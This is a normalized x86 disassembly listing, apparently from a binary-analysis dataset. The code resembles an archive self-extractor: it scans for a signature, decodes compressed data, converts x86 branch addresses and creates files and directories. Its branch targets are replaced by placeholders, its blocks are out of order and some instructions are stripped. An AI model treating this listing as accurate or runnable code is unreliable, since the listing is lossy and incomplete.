mov edi [ ebp - 0x1c ]
je r-xdata
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x20 ]
push [ esi ]
push eax
call [ eax + 0x4 ]
mov eax [ ebp + 0xc ]
pop ecx
or [ eax ] 0xffffffff
mov eax [ ebp + 0x14 ]
pop ecx
xor ecx ecx
mov [ eax ] ecx
mov [ esi ] ecx
xor eax eax
jmp r-xdata
imul eax eax 0x28
add eax [ edi + 0xc ]
mov ecx eax
mov [ ebp - 0x8 ] eax
call sub_404019
mov ecx [ edi + 0x34 ]
mov esi eax
mov eax [ edi + 0x30 ]
mov [ ebp - 0x20 ] edx
mov edx [ ebp - 0xc ]
mov [ ebp - 0x4 ] esi
mov eax [ eax + edx * 4 ]
mov ebx [ ecx + eax * 8 ]
add ebx [ edi + 0x28 ]
mov eax [ ecx + eax * 8 + 0x4 ]
adc eax [ edi + 0x2c ]
mov [ ebp - 0x14 ] ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
cmp esi esi
jne r-xdata
mov ebx [ ebp + 0xc ]
cmp [ ebx ] eax
mov ebx [ ebp + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x2
xor eax eax
cmp eax [ ebp - 0x20 ]
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx [ ebp - 0xc ]
mov edi ebx
mov [ ebp + 0x8 ] eax
shl edi 0x5
add edi eax
xor eax eax
mov [ ecx ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x38 ]
mov eax [ eax + edx * 4 ]
mov edx [ ebp + 0x10 ]
mov [ ebp + 0x18 ] eax
cmp eax ebx
jae r-xdata
mov eax [ ebp + 0xc ]
push [ ebp - 0x24 ]
mov [ eax ] edx
mov eax [ ebp + 0x20 ]
push eax
call [ eax + 0x4 ]
push [ ebp - 0x10 ]
mov esi [ ebp + 0x10 ]
push [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
xor eax eax
mov [ esi ] eax
call sub_4062f5
add esp 0x10
test eax eax
jne r-xdata
mov eax [ ebp + 0x1c ]
mov ebx [ edi + 0x8 ]
mov [ eax ] ebx
mov eax [ ecx ]
mov ecx [ ebp + 0x14 ]
mov [ ebp + 0x8 ] eax
add eax ebx
cmp eax [ ecx ]
jbe r-xdata
mov edx [ ebp + 0x8 ]
shl eax 0x5
add edx 0x8
add edx eax
sub ebx [ ebp + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
test eax eax
je r-xdata
cmp [ edi + 0x1b ] 0x0
je r-xdata
push 0xb
jmp r-xdata
mov eax [ edx ]
add [ ecx ] eax
lea edx [ edx + 0x20 ]
dec ebx
jne r-xdata
mov edx [ ebp + 0x10 ]
push [ ebp + 0x24 ]
mov ecx [ ebp - 0xc ]
push eax
push [ esi ]
mov eax [ edi + 0x30 ]
push [ ebp - 0x10 ]
mov ecx [ eax + ecx * 4 ]
mov eax [ edi ]
push [ ebp - 0x14 ]
lea edx [ eax + ecx * 8 ]
push [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
call sub_403d2f
mov esi eax
add esp 0x18
test esi esi
jne r-xdata
push eax
mov eax [ ebp + 0x20 ]
push eax
call [ eax ]
pop ecx
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
mov ecx [ edx ]
add ecx [ ebp + 0x8 ]
mov edx ebx
call sub_40337a
cmp eax [ edi + 0x10 ]
push 0x3
pop ecx
cmovne esi ecx
pop eax
mov eax [ ebp - 0x8 ]
xor ecx ecx
cmp [ eax + 0x1c ] ecx
je r-xdata
mov eax [ ebp - 0x4 ]
push 0x2
jmp r-xdata
mov ecx [ ebp + 0x18 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ ecx ]
call sub_40337a
mov ecx [ ebp - 0x8 ]
cmp eax [ ecx + 0x20 ]
je r-xdata
pop esi
jmp r-xdata
push 0x3
sub_405d27
push ebp
mov ebp esp
mov eax 0x800c
call sub_4132b0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi edx
xor ebx ebx
and [ edi ] ebx
and [ edi + 0x4 ] ebx
mov [ ebp - 0x800c ] ecx
xor eax eax
cmp [ ebp - 0x8008 ] eax
je r-xdata
add ebx [ ebp - 0x8008 ]
mov ecx [ ebp - 0x800c ]
cmp ebx 0x20
jbe r-xdata
mov eax 0x8000
sub eax ebx
mov [ ebp - 0x8008 ] eax
lea eax [ ebp - 0x8008 ]
lea edx [ ebp - 0x8004 ]
push eax
add edx ebx
call sub_403db9
pop ecx
test eax eax
jne r-xdata
lea eax [ ebx - 0x20 ]
xor esi esi
mov [ ebp - 0x8008 ] eax
test eax eax
je r-xdata
add [ edi ] eax
adc [ edi + 0x4 ] 0x0
sub ebx eax
lea eax [ ebp + eax - 0x8004 ]
push ebx
push eax
lea eax [ ebp - 0x8004 ]
push eax
call sub_40e0b0
add esp 0xc
cmp [ edi + 0x4 ] 0x0
ja r-xdata
jmp r-xdata
cmp [ edi ] __dos_header
ja r-xdata
cmp [ ebp + esi - 0x8004 ] 0x37
jne r-xdata
mov ecx [ ebp - 0x800c ]
jmp r-xdata
cmp esi eax
jae r-xdata
cmp esi eax
je r-xdata
inc esi
mov eax [ ebp + esi - 0x8004 ]
mov ecx rw-data
cmp eax [ ecx ]
jne r-xdata
mov eax [ ebp - 0x8008 ]
inc esi
cmp esi eax
jb r-xdata
movzx eax [ ebp + esi - 0x8000 ]
cmp ax [ ecx + 0x4 ]
jne r-xdata
push 0x14
lea ecx [ ebp - 0x7ff8 ]
add ecx esi
pop edx
call sub_40337a
cmp eax [ ebp + esi - 0x7ffc ]
je r-xdata
add [ edi ] esi
adc [ edi + 0x4 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
sub_405e52
push ebp
mov ebp esp
mov eax 0x493c
call sub_4132b0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x48c8 ] ecx
xor ecx ecx
push 0x61a
mov [ ebp - 0x628 ] ax
push ecx
lea eax [ ebp - 0x626 ]
push eax
mov ebx edx
mov edi ecx
call sub_414160
mov esi ebx
add esp 0xc
lea ecx [ esi + 0x2 ]
xor edx edx
mov ax [ esi ]
add esi 0x2
cmp ax dx
jne r-xdata
push ebx
lea eax [ ebp - 0x628 ]
sub esi ecx
push 0x30e
push eax
sar esi 0x1
call sub_40ea28
add esp 0xc
push 0x5c
pop eax
cmp [ ebx + esi * 2 - 0x2 ] ax
je r-xdata
xor ebx ebx
push r--data
lea eax [ ebp - 0x628 ]
push 0x30e
push eax
call sub_40e9bc
lea esi [ ebp - 0x628 ]
add esp 0xc
lea ecx [ esi + 0x2 ]
xor ebx ebx
xorps xmm0 xmm0
lea edx [ ebp - 0x48e0 ]
lea ecx [ ebp - 0x62c ]
movlpd [ ebp - 0x48e0 ] xmm0
call sub_405d27
test eax eax
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov ax [ esi ]
add esi 0x2
cmp ax bx
jne r-xdata
sub esi ecx
sar esi 0x1
jmp r-xdata
push 0xb
pop edi
jmp r-xdata
push ebx
lea edx [ ebp - 0x48e0 ]
lea ecx [ ebp - 0x62c ]
call sub_403eb1
pop ecx
test eax eax
je r-xdata
call sub_40338e
push ebx
push 0x80
push 0x3
push ebx
push 0x1
push 0x80000000
push [ ebp - 0x48c8 ]
mov [ ebp - 0x890 ] sub_403322
mov [ ebp - 0x88c ] sub_40333a
mov [ ebp - 0x898 ] sub_403322
mov [ ebp - 0x894 ] sub_40333a
mov [ ebp - 0x634 ] sub_403f3e
mov [ ebp - 0x630 ] sub_403f5c
mov [ ebp - 0x48b8 ] sub_40637d
mov [ ebp - 0x48b4 ] sub_4063d0
mov [ ebp - 0x48b0 ] sub_4063e0
mov [ ebp - 0x48ac ] sub_40642a
call [ CreateFileW@IAT ]
mov [ ebp - 0x62c ] eax
cmp eax 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x4938 ]
call sub_4040db
test edi edi
jne r-xdata
lea eax [ ebp - 0x634 ]
mov [ ebp - 0x48a8 ] eax
mov [ ebp - 0x48a0 ] ebx
mov [ ebp - 0x48a4 ] ebx
lea edx [ ebp - 0x890 ]
lea ecx [ ebp - 0x4938 ]
call sub_40410a
lea ecx [ ebp - 0x62c ]
call sub_403d97
mov ecx [ ebp - 0x4 ]
xor eax eax
test edi edi
pop edi
setne al
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
lea eax [ ebp - 0x898 ]
push eax
lea eax [ ebp - 0x890 ]
push eax
lea edx [ ebp - 0x48b8 ]
call sub_405872
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
or [ ebp - 0x48e4 ] 0xffffffff
cmp [ ebp - 0x491c ] 0x0
mov [ ebp - 0x48cc ] ebx
mov [ ebp - 0x48e8 ] ebx
mov [ ebp - 0x48c4 ] ebx
jbe r-xdata
lea edx [ ebp - 0x890 ]
lea ecx [ ebp - 0x4938 ]
call sub_40410a
test edi edi
jne r-xdata
push [ ebp - 0x48cc ]
lea eax [ ebp - 0x890 ]
push eax
call [ ebp - 0x88c ]
pop ecx
pop ecx
xor eax eax
mov [ ebp - 0x48bc ] eax
push 0xb
pop edi
lea eax [ ebp - 0x628 ]
mov edx ebx
lea eax [ eax + esi * 2 ]
push eax
lea ecx [ ebp - 0x4938 ]
call sub_4051ad
pop ecx
lea eax [ ebp - 0x898 ]
push eax
lea eax [ ebp - 0x890 ]
push eax
lea eax [ ebp - 0x48d0 ]
push eax
lea eax [ ebp - 0x48d4 ]
push eax
lea eax [ ebp - 0x48e8 ]
push eax
lea eax [ ebp - 0x48cc ]
push eax
lea eax [ ebp - 0x48e4 ]
push eax
push ebx
lea edx [ ebp - 0x48b8 ]
lea ecx [ ebp - 0x4938 ]
call sub_405b3c
mov edi eax
add esp 0x20
mov [ ebp - 0x48dc ] edi
test edi edi
jne r-xdata
lea ecx [ ebp - 0x628 ]
xor edx edx
lea ecx [ ecx + esi * 2 ]
mov eax edx
mov [ ebp - 0x48c0 ] edx
cmp [ ecx ] dx
je r-xdata
mov eax [ ebp - 0x48bc ]
mov ecx [ ebp - 0x48c8 ]
cmp [ eax + ecx + 0x19 ] 0x0
je r-xdata
mov ebx ecx
lea eax [ ebp - 0x888 ]
push eax
lea eax [ ebp - 0x628 ]
push eax
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
jne r-xdata
push edx
lea eax [ ebp - 0x628 ]
push eax
call [ CreateDirectoryW@IAT ]
test eax eax
jne r-xdata
inc eax
mov [ ebp - 0x48c0 ] eax
lea ebx [ ecx + eax * 2 ]
cmp [ ebx ] di
jne r-xdata
xor eax eax
mov [ ebx ] ax
push edi
lea eax [ ebp - 0x628 ]
push eax
call [ CreateDirectoryW@IAT ]
test eax eax
jne r-xdata
push eax
call [ FindClose@IAT ]
xor edx edx
push edx
push 0x80
push 0x2
push edx
push 0x1
push 0x40000000
lea eax [ ebp - 0x628 ]
push eax
call [ CreateFileW@IAT ]
mov [ ebp - 0x48c4 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ ebp - 0x48bc ]
call [ GetLastError@IAT ]
jmp r-xdata
cmp [ ebx ] 0x2f
jne r-xdata
mov edi [ ebp - 0x48dc ]
mov ebx [ ebp - 0x48c4 ]
xor edx edx
push 0x5c
pop eax
lea ecx [ ebp - 0x628 ]
mov [ ebx ] ax
mov eax [ ebp - 0x48c0 ]
lea ecx [ ecx + esi * 2 ]
call [ GetLastError@IAT ]
mov eax [ ebp - 0x48d0 ]
mov edx [ ebp - 0x48d4 ]
mov [ ebp - 0x48c0 ] eax
lea eax [ ebp - 0x48c0 ]
push eax
mov eax [ ebp - 0x48cc ]
lea ecx [ ebp - 0x48c4 ]
lea edx [ edx + eax ]
call sub_403e35
pop ecx
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push 0xb
pop edi
mov eax [ ebp - 0x48d0 ]
cmp [ ebp - 0x48c0 ] eax
je r-xdata
mov ecx [ ebp - 0x48f8 ]
mov [ ebp - 0x48d4 ] eax
mov [ ebp - 0x48d0 ] eax
mov eax [ ebp - 0x4928 ]
mov [ ebp - 0x48c8 ] eax
mov eax [ ecx + ebx * 4 + 0x4 ]
sub eax [ ecx + ebx * 4 ]
cmp eax 0x104
jae r-xdata
test eax eax
jne r-xdata
lea ecx [ ebp - 0x48c4 ]
call sub_403d97
test edi edi
jne r-xdata
mov edi eax
jmp r-xdata
mov eax [ ebp - 0x48bc ]
mov ecx [ ebp - 0x48c8 ]
cmp [ eax + ecx + 0x1d ] 0x0
je r-xdata
inc ebx
add eax 0x20
mov [ ebp - 0x48c4 ] ebx
mov [ ebp - 0x48bc ] eax
cmp ebx [ ebp - 0x491c ]
jae r-xdata
push [ eax + ecx + 0x14 ]
lea eax [ ebp - 0x628 ]
push eax
call [ SetFileAttributesW@IAT ]
sub_4062f5
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
push 0x0
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ ecx + 0xc ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
add esp 0xc
call sub_40e09b
leave
retn
sub_40632a
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi edx
mov ebx ecx
test esi esi
je r-xdata
xor eax eax
lea eax [ ebp - 0x8 ]
push eax
push edi
push ebx
mov [ ebp - 0x8 ] esi
call [ ebx + 0x8 ]
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
add edi eax
sub esi eax
jne r-xdata
sub_40637d
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
xor edx edx
mov eax [ edi + 0x18 ]
sub eax [ edi + 0x14 ]
jne r-xdata
cmp eax [ esi ]
jae r-xdata
cmp [ esi ] edx
jbe r-xdata
mov eax [ ebp + 0xc ]
lea ecx [ edi + 0x1c ]
add ecx [ edi + 0x14 ]
pop edi
mov [ eax ] ecx
mov eax edx
pop esi
pop ebp
retn
mov [ esi ] eax
mov eax 0x4000
mov [ edi + 0x14 ] edx
cmp [ esi ] eax
jbe r-xdata
mov ecx [ edi + 0x10 ]
push esi
lea eax [ edi + 0x1c ]
push eax
push ecx
call [ ecx ]
mov edx eax
mov eax [ esi ]
add esp 0xc
mov [ edi + 0x18 ] eax
mov [ esi ] eax
sub_4063e0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov eax [ ebx + 0x14 ]
mov edi [ ebx + 0x18 ]
sub edi eax
jne r-xdata
push esi
mov esi [ ebp + 0x10 ]
cmp edi [ esi ]
cmova edi [ esi ]
add eax 0x1c
push edi
add eax ebx
push eax
push [ ebp + 0xc ]
call sub_410100
add [ ebx + 0x14 ] edi
add esp 0xc
mov [ esi ] edi
xor eax eax
pop esi
push [ ebp + 0x10 ]
mov eax [ ebx + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ eax ]
add esp 0xc
jmp r-xdata
pop edi
pop ebx
pop ebp
retn
sub_40642a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
and [ eax + 0x18 ] 0x0
and [ eax + 0x14 ] 0x0
mov eax [ eax + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ eax + 0x4 ]
add esp 0xc
pop ebp
retn
sub_40644a
push ebp
mov ebp esp
sub esp 0x22c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x224 ] eax
xor eax eax
push ebx
mov [ ebp - 0x214 ] eax
mov bl al
push esi
mov esi eax
mov [ ebp - 0x22c ] edx
mov eax 0x400
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
push edi
mov [ ebp - 0x228 ] ecx
mov ecx 0x81
lea edi [ ebp - 0x208 ]
[ edi ]
mov edi [ ebp + 0x18 ]
mov eax [ ebp + 0x1c ]
add eax edi
mov [ ebp - 0x220 ] eax
xor eax eax
or [ ebp - 0x210 ] 0xffffffff
mov ecx eax
mov edx eax
xor eax eax
inc eax
movzx eax [ edi ]
shl ecx 0x8
or ecx eax
inc edi
inc edx
mov [ ebp - 0x218 ] ecx
mov [ ebp + 0x18 ] edi
cmp edx 0x5
jl r-xdata
cmp edi [ ebp - 0x220 ]
je r-xdata
cmp [ ebp + 0x24 ] esi
jne r-xdata
mov edx [ ebp - 0x22c ]
sub edx [ ebp - 0x214 ]
mov eax [ ebp + 0x24 ]
sub eax esi
cmp eax edx
cmovb edx eax
test edx edx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
cmp esi [ ebp + 0x24 ]
setne al
jmp r-xdata
mov edi [ ebp - 0x214 ]
mov ecx [ ebp - 0x224 ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
mov ecx [ ebp - 0x218 ]
mov [ ebp - 0x214 ] edi
mov edi [ ebp + 0x18 ]
test edx edx
je r-xdata
cmp bl 0xf
jne r-xdata
cmp esi [ ebp + 0x24 ]
je r-xdata
inc edi
mov bl ah
dec edx
jne r-xdata
mov al ah
and al 0xf0
cmp al 0x80
je r-xdata
mov edx [ ebp - 0x214 ]
mov eax [ ebp - 0x228 ]
mov al [ eax + edx ]
inc edx
mov [ ebp - 0x209 ] al
mov [ ebp - 0x214 ] edx
cmp al 0xe8
jne r-xdata
mov eax [ ebp - 0x228 ]
mov ah [ eax + edi ]
mov al ah
mov [ ecx + esi ] ah
and al 0xfe
inc esi
cmp al 0xe8
je r-xdata
lea ebx [ ebp - 0x8 ]
lea edx [ ebp - 0x6 ]
cmp al 0xe9
cmovne ebx edx
movzx eax bl
lea ebx [ ebp - 0x208 ]
lea ebx [ ebx + eax * 2 ]
jmp r-xdata
sub [ ebp - 0x210 ] edx
sub ecx edx
mov edx [ ebp - 0x21c ]
shr eax 0x5
sub edx eax
mov eax [ ebp - 0x210 ]
mov [ ebp - 0x218 ] ecx
mov [ ebx ] dx
cmp eax 0x1000000
jae r-xdata
mov eax 0x800
sub eax [ ebp - 0x21c ]
mov [ ebp - 0x210 ] edx
shr eax 0x5
add eax [ ebp - 0x21c ]
mov [ ebx ] ax
cmp edx 0x1000000
jae r-xdata
movzx eax [ ebx ]
mov edx [ ebp - 0x210 ]
shr edx 0xb
imul edx eax
mov [ ebp - 0x21c ] eax
cmp ecx edx
jae r-xdata
cmp [ ebp - 0x209 ] 0xe8
jne r-xdata
cmp edi [ ebp - 0x220 ]
je r-xdata
mov bl [ ebp - 0x209 ]
jmp r-xdata
cmp edi [ ebp - 0x220 ]
je r-xdata
mov eax [ ebp + 0x14 ]
mov ebx [ ebp + 0x10 ]
mov edx ebx
cmp eax 0x4
jb r-xdata
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov edx ebx
cmp eax 0x4
jb r-xdata
shl eax 0x8
mov [ ebp - 0x210 ] eax
movzx eax [ edi ]
shl ecx 0x8
or ecx eax
inc edi
mov [ ebp - 0x218 ] ecx
mov [ ebp + 0x18 ] edi
mov eax edx
shl eax 0x8
mov [ ebp - 0x210 ] eax
movzx eax [ edi ]
shl ecx 0x8
or ecx eax
inc edi
mov [ ebp - 0x218 ] ecx
mov [ ebp + 0x18 ] edi
add ebx 0x4
sub eax 0x4
mov [ ebp + 0x10 ] ebx
mov [ ebp + 0x14 ] eax
add ebx 0x4
sub eax 0x4
mov [ ebp + 0x8 ] ebx
mov [ ebp + 0xc ] eax
jmp r-xdata
mov eax ebx
shr eax 0x8
mov [ edx + esi ] al
inc esi
cmp esi [ ebp + 0x24 ]
je r-xdata
movzx ebx [ edx ]
movzx eax [ edx + 0x1 ]
shl ebx 0x8
or ebx eax
movzx eax [ edx + 0x2 ]
shl ebx 0x8
or ebx eax
movzx eax [ edx + 0x3 ]
mov edx [ ebp - 0x224 ]
shl ebx 0x8
or ebx eax
sub ebx esi
sub ebx 0x4
mov [ edx + esi ] bl
inc esi
cmp esi [ ebp + 0x24 ]
je r-xdata
mov eax ebx
shr eax 0x10
mov [ edx + esi ] al
inc esi
cmp esi [ ebp + 0x24 ]
je r-xdata
shr ebx 0x18
mov [ edx + esi ] bl
inc esi
jmp r-xdata
sub_40670c
push ebx
push edi
mov edi edx
mov ebx ecx
cmp edi 0x4
jae r-xdata
push esi
sub edi 0x4
xor esi esi
xor eax eax
jmp r-xdata
add esi 0x4
cmp esi edi
jbe r-xdata
movzx edx [ esi + ebx + 0x2 ]
movzx eax [ esi + ebx + 0x1 ]
shl edx 0x8
or edx eax
movzx eax [ esi + ebx ]
shl edx 0x8
or edx eax
shl edx 0x2
sub edx esi
sub edx 0x8
shr edx 0x2
mov eax edx
shr eax 0x10
mov ecx edx
shr ecx 0x8
mov [ esi + ebx + 0x2 ] al
mov [ esi + ebx + 0x1 ] cl
mov [ esi + ebx ] dl
pop edi
pop ebx
retn
cmp [ esi + ebx + 0x3 ] 0xeb
jne r-xdata
mov eax esi
pop esi
sub_40676d
push ebp
mov ebp esp
sub esp 0x14
push esi
mov esi [ ebp + 0xc ]
push edi
mov esi [ esi ]
mov eax ecx
xor edi edi
and esi 0x7
mov [ ebp - 0x4 ] eax
cmp edx 0x5
jae r-xdata
push ebx
lea ecx [ edx - 0x4 ]
or ebx 0xffffffff
add ecx eax
mov [ ebp - 0x8 ] ecx
xor eax eax
jmp r-xdata
mov edi edx
sub edi eax
cmp edx ecx
jae r-xdata
mov al [ edx ]
and al 0xfe
cmp al 0xe8
je r-xdata
pop edi
pop esi
leave
retn
mov edx edi
sub edx ebx
xor eax eax
lea ecx [ edx - 0x1 ]
shl esi cl
pop ebx
and esi 0x7
cmp edx 0x3
cmova esi eax
mov eax [ ebp + 0xc ]
mov [ eax ] esi
mov eax edi
mov ecx edi
sub ecx ebx
cmp ecx 0x3
jbe r-xdata
mov eax [ ebp - 0x4 ]
inc edx
cmp edx ecx
jb r-xdata
dec ecx
shl esi cl
and esi 0x7
je r-xdata
xor esi esi
mov al [ edx + 0x4 ]
mov ebx edi
mov [ ebp - 0x14 ] ebx
test al al
je r-xdata
movzx eax [ esi + r--data ]
mov ecx edx
sub ecx eax
cmp [ esi + r--data ] 0x0
mov al [ ecx + 0x4 ]
je r-xdata
movzx ebx al
movzx eax [ edx + 0x3 ]
shl ebx 0x8
or ebx eax
movzx eax [ edx + 0x2 ]
shl ebx 0x8
or ebx eax
movzx eax [ edx + 0x1 ]
shl ebx 0x8
or ebx eax
cmp al 0xff
jne r-xdata
mov ebx edi
test al al
je r-xdata
mov eax ebx
shr eax 0x18
and al 0x1
dec al
not al
mov [ edx + 0x4 ] al
mov eax ebx
shr eax 0x10
mov [ edx + 0x3 ] al
mov eax ebx
shr eax 0x8
mov [ edx + 0x1 ] bl
mov ebx [ ebp - 0x14 ]
mov [ edx + 0x2 ] al
add edi 0x5
jmp r-xdata
movzx eax [ esi + r--data ]
shl eax 0x3
push 0x18
pop ecx
sub ecx eax
mov [ ebp - 0xc ] eax
mov eax ebx
shr eax cl
test al al
je r-xdata
and esi 0x3
add esi esi
or esi 0x1
inc edi
lea edx [ edi + eax ]
cmp edx ecx
jae r-xdata
cmp al 0xff
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push 0x20
xor ebx ebx
pop ecx
sub ecx [ ebp - 0xc ]
inc ebx
shl ebx cl
dec ebx
xor ebx [ ebp - 0x10 ]
jmp r-xdata
cmp al 0xff
jne r-xdata
sub ebx edi
sub ebx 0x5
mov [ ebp - 0x10 ] ebx
test esi esi
je r-xdata
sub_4068c1
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] ecx
xor ebx ebx
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
cpuid
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ esi ] eax
mov eax [ ebp - 0xc ]
mov [ ecx ] eax
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x10 ]
mov [ ecx ] eax
mov ecx [ ebp + 0x10 ]
mov eax [ ebp - 0x14 ]
pop esi
mov [ ecx ] eax
pop ebx
leave
retn
sub_406906
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
mov [ ebp - 0x8 ] 0x40000
pushfd
pop eax
mov edx eax
xor eax [ ebp - 0x8 ]
push eax
popfd
pushfd
pop eax
xor eax edx
push edx
popfd
and [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] 0x200000
pushfd
pop eax
mov edx eax
xor eax [ ebp - 0x8 ]
push eax
popfd
pushfd
pop eax
xor eax edx
push edx
popfd
and [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ esi + 0x8 ]
push eax
lea eax [ esi + 0xc ]
push eax
lea eax [ esi + 0x4 ]
push eax
mov edx esi
xor ecx ecx
call sub_4068c1
lea eax [ esi + 0x1c ]
push eax
lea eax [ esi + 0x18 ]
push eax
lea eax [ esi + 0x14 ]
xor ecx ecx
push eax
lea edx [ esi + 0x10 ]
inc ecx
call sub_4068c1
xor eax eax
add esp 0x18
inc eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40e09b
leave
retn
sub_406999
push ebp
mov ebp esp
sub esp 0x24
lea ecx [ ebp - 0x24 ]
push ebx
push esi
push edi
call sub_406906
test eax eax
je r-xdata
xor eax eax
inc eax
mov esi [ ebp - 0x14 ]
mov edx esi
shr edx 0x8
shr esi 0x4
and edx 0xff00f
and esi 0xf00f
xor eax eax
mov [ ebp - 0x4 ] edx
mov ecx eax
mov edi rw-data
mov ebx eax
add ebx 0xc
inc ecx
add edi 0xc
cmp ebx 0x24
jb r-xdata
mov edx [ ebp - 0x1c ]
cmp [ edi - 0x4 ] edx
mov edx [ ebp - 0x4 ]
jne r-xdata
mov edx [ ebp - 0x20 ]
cmp [ edi - 0x8 ] edx
mov edx [ ebp - 0x4 ]
jne r-xdata
or ecx 0xffffffff
mov edx [ ebp - 0x18 ]
cmp [ edi ] edx
mov edx [ ebp - 0x4 ]
je r-xdata
cmp edx 0x6
jb r-xdata
dec ecx
je r-xdata
sub ecx eax
je r-xdata
jne r-xdata
cmp edx 0x5
jb r-xdata
dec ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0x100c
jne r-xdata
cmp edx 0x6
jb r-xdata
cmp esi 0x6
jb r-xdata
jne r-xdata
cmp esi 0xa
jmp r-xdata
cmp esi 0xf
jae r-xdata
jne r-xdata
jmp r-xdata
sub_406a46
push esi
mov esi edx
cmp cl 0x28
jbe r-xdata
jne r-xdata
push 0x4
pop eax
pop esi
retn
movzx edx cl
mov ecx edx
shr ecx 0x1
and edx 0x1
add ecx 0xb
or edx 0x2
shl edx cl
or edx 0xffffffff
jmp r-xdata
mov eax edx
shr eax 0x8
mov [ esi + 0x2 ] al
mov eax edx
mov [ esi + 0x1 ] dl
shr eax 0x10
shr edx 0x18
mov [ esi + 0x3 ] al
mov [ esi ] 0x4
mov [ esi + 0x4 ] dl
xor eax eax
pop esi
retn
sub_406a8c
push ebx
push esi
mov esi ecx
xor ebx ebx
mov eax [ esi + 0x78 ]
push edi
sub eax ebx
je r-xdata
mov [ esi + 0x7c ] dl
test dl dl
jne r-xdata
dec eax
je r-xdata
js r-xdata
push 0x8
movzx eax dl
shl eax 0x8
or [ esi + 0x74 ] eax
push 0x2
jmp r-xdata
dec eax
je r-xdata
movzx eax dl
and eax 0x1f
shl eax 0x10
mov [ esi + 0x74 ] eax
and dl 0x7f
cmp dl 0x2
jbe r-xdata
pop edi
pop esi
pop ebx
retn
pop eax
jmp r-xdata
movzx eax dl
or eax [ esi + 0x74 ]
push 0x3
inc eax
test [ esi + 0x7c ] 0x80
mov [ esi + 0x74 ] eax
pop eax
push 0x6
pop ecx
cmove eax ecx
jmp r-xdata
dec eax
je r-xdata
mov [ esi + 0x74 ] ebx
jmp r-xdata
push 0x9
jmp r-xdata
movzx eax dl
shl eax 0x8
mov [ esi + 0x70 ] eax
push 0x4
jmp r-xdata
dec eax
je r-xdata
xor eax eax
inc eax
movzx eax dl
or eax [ esi + 0x70 ]
inc eax
mov [ esi + 0x70 ] eax
mov al [ esi + 0x7c ]
and al 0x60
cmp al 0x40
jb r-xdata
push 0x9
dec eax
jne r-xdata
cmp [ esi + 0x88 ] ebx
push 0x6
pop eax
push 0x9
pop ecx
cmovne eax ecx
jmp r-xdata
push 0x5
jmp r-xdata
